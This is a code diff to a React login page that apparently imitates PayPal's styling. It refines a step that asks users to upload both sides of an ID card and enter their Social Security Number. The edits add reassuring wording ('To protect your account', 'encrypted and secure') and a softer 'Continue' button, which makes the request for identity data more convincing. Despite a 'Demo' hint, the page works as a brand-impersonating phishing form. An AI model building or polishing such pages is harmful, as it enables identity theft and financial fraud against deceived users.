@@ -154,23 +154,23 @@ export default function LoginPage() {
 
   const renderVerifyDocumentsStep = () => (
     <form onSubmit={handleDocumentVerification} data-testid="form-verify-documents">
-      <div className="flex flex-col items-center mb-6">
-        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
-          <User className="w-8 h-8 text-[#0070e0]" />
+      <div className="flex flex-col items-center mb-8">
+        <div className="w-20 h-20 rounded-full bg-[#0070e0]/10 dark:bg-[#0070e0]/20 flex items-center justify-center mb-5">
+          <User className="w-10 h-10 text-[#0070e0]" />
         </div>
-        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
+        <h1 className="text-[24px] sm:text-[28px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-3">
           Verify your identity
-        </h2>
-        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
-          Please upload your ID card and provide your SSN
+        </h1>
+        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
+          To protect your account, please upload a photo of your ID and provide your Social Security Number
         </p>
       </div>
 
-      <div className="space-y-5">
+      <div className="space-y-6">
         {/* ID Card Front */}
         <div>
-          <label className="block text-[13px] font-medium text-[#1a1a1a] dark:text-white mb-2">
-            ID Card (Front) *
+          <label className="block text-[14px] font-medium text-[#1a1a1a] dark:text-white mb-3">
+            ID Card (Front)
           </label>
           <div className="relative">
             <input
@@ -183,17 +183,27 @@ export default function LoginPage() {
             />
             <label
               htmlFor="id-front"
-              className="flex items-center justify-center w-full h-[120px] border-2 border-dashed border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md cursor-pointer hover:border-[#0070e0] transition-colors bg-[#f9f9f9] dark:bg-[#1a1a1a]"
+              className="flex flex-col items-center justify-center w-full h-[140px] border-2 border-dashed border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#0070e0] hover:bg-[#f5f9fc] dark:hover:bg-[#0a1a2a] transition-all bg-white dark:bg-[#1a1a1a]"
             >
               {idCardFront ? (
-                <div className="text-center">
-                  <p className="text-[14px] text-[#0070e0] font-medium">{idCardFront.name}</p>
-                  <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">Click to change</p>
+                <div className="text-center px-4">
+                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#0070e0]/10 flex items-center justify-center">
+                    <svg className="w-6 h-6 text-[#0070e0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                    </svg>
+                  </div>
+                  <p className="text-[14px] text-[#1a1a1a] dark:text-white font-medium truncate">{idCardFront.name}</p>
+                  <p className="text-[13px] text-[#0070e0] mt-2">Tap to change</p>
                 </div>
               ) : (
-                <div className="text-center">
-                  <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f]">Click to upload</p>
-                  <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG, PNG (max 5MB)</p>
+                <div className="text-center px-4">
+                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center">
+                    <svg className="w-6 h-6 text-[#6c7378]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
+                    </svg>
+                  </div>
+                  <p className="text-[15px] text-[#1a1a1a] dark:text-white font-medium">Upload front of ID</p>
+                  <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG or PNG (max 5MB)</p>
                 </div>
               )}
             </label>
@@ -202,8 +212,8 @@ export default function LoginPage() {
 
         {/* ID Card Back */}
         <div>
-          <label className="block text-[13px] font-medium text-[#1a1a1a] dark:text-white mb-2">
-            ID Card (Back) *
+          <label className="block text-[14px] font-medium text-[#1a1a1a] dark:text-white mb-3">
+            ID Card (Back)
           </label>
           <div className="relative">
             <input
@@ -216,17 +226,27 @@ export default function LoginPage() {
             />
             <label
               htmlFor="id-back"
-              className="flex items-center justify-center w-full h-[120px] border-2 border-dashed border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md cursor-pointer hover:border-[#0070e0] transition-colors bg-[#f9f9f9] dark:bg-[#1a1a1a]"
+              className="flex flex-col items-center justify-center w-full h-[140px] border-2 border-dashed border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#0070e0] hover:bg-[#f5f9fc] dark:hover:bg-[#0a1a2a] transition-all bg-white dark:bg-[#1a1a1a]"
             >
               {idCardBack ? (
-                <div className="text-center">
-                  <p className="text-[14px] text-[#0070e0] font-medium">{idCardBack.name}</p>
-                  <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">Click to change</p>
+                <div className="text-center px-4">
+                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#0070e0]/10 flex items-center justify-center">
+                    <svg className="w-6 h-6 text-[#0070e0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                    </svg>
+                  </div>
+                  <p className="text-[14px] text-[#1a1a1a] dark:text-white font-medium truncate">{idCardBack.name}</p>
+                  <p className="text-[13px] text-[#0070e0] mt-2">Tap to change</p>
                 </div>
               ) : (
-                <div className="text-center">
-                  <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f]">Click to upload</p>
-                  <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG, PNG (max 5MB)</p>
+                <div className="text-center px-4">
+                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center">
+                    <svg className="w-6 h-6 text-[#6c7378]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
+                    </svg>
+                  </div>
+                  <p className="text-[15px] text-[#1a1a1a] dark:text-white font-medium">Upload back of ID</p>
+                  <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG or PNG (max 5MB)</p>
                 </div>
               )}
             </label>
@@ -235,8 +255,8 @@ export default function LoginPage() {
 
         {/* SSN Input */}
         <div>
-          <label className="block text-[13px] font-medium text-[#1a1a1a] dark:text-white mb-2">
-            Social Security Number *
+          <label className="block text-[14px] font-medium text-[#1a1a1a] dark:text-white mb-3">
+            Social Security Number
           </label>
           <input
             type="text"
@@ -244,33 +264,35 @@ export default function LoginPage() {
             placeholder="XXX-XX-XXXX"
             value={ssn}
             onChange={(e) => setSsn(formatSSN(e.target.value))}
-            className="w-full h-[48px] px-4 text-[15px] border-2 border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md bg-white dark:bg-[#1a1a1a] text-[#1a1a1a] dark:text-white placeholder-[#6c7378] dark:placeholder-[#8f8f8f] transition-all duration-150 focus:outline-none focus:border-[#0070e0] focus:ring-0"
+            className="paypal-input"
             data-testid="input-ssn"
             maxLength={11}
           />
-          <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] mt-2">
-            Demo: Enter any 9 digits
+          <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-3">
+            We need this to verify your identity. Demo: Enter any 9 digits
           </p>
         </div>
 
         <button
           type="submit"
-          className="paypal-btn-primary flex items-center justify-center gap-2"
+          className="paypal-btn-primary flex items-center justify-center gap-2 mt-8"
           disabled={!idCardFront || !idCardBack || ssn.replace(/\D/g, "").length < 9 || isLoading}
           data-testid="button-verify-documents"
         >
           {isLoading ? (
             <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
           ) : (
-            "Submit Documents"
+            "Continue"
           )}
         </button>
 
-        <div className="pt-4 border-t border-[#e8e8e8] dark:border-[#3d3d3d]">
-          <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
-            <Lock className="w-3 h-3 inline mr-1" />
-            Your information is encrypted and secure
-          </p>
+        <div className="pt-6 mt-6 border-t border-[#e8e8e8] dark:border-[#2a2a2a]">
+          <div className="flex items-center justify-center gap-2 text-[#6c7378] dark:text-[#8f8f8f]">
+            <Lock className="w-4 h-4" />
+            <p className="text-[13px]">
+              Your information is encrypted and secure
+            </p>
+          </div>
         </div>
       </div>
     </form>
